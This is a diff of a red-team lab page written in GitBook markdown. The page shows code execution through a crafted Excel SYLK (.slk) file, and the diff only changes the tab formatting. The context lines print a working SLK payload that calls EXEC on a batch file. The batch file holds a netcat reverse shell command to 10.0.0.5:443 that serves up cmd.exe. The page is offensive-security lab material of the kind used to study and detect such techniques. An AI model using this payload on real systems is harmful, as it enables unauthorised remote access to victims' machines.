@@ -6,8 +6,8 @@ This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked) -
 
 Create an new text file, put the the below code and save it as .slk file:
 
-{% code-tabs %}
-{% code-tabs-item title="demo.slk" %}
+{% tabs %}
+{% tab title="demo.slk" %}
 ```csharp
 ID;P
 O;E
@@ -16,20 +16,20 @@ C;X1;Y101;K0;EEXEC("c:\shell.cmd")
 C;X1;Y102;K0;EHALT()
 E
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../../.gitbook/assets/slk-text.png)
 
 Note that the shell.cmd refers to a simple nc reverse shell batch file:
 
-{% code-tabs %}
-{% code-tabs-item title="c:\\shell.cmd" %}
+{% tabs %}
+{% tab title="c:\\shell.cmd" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Execution
 
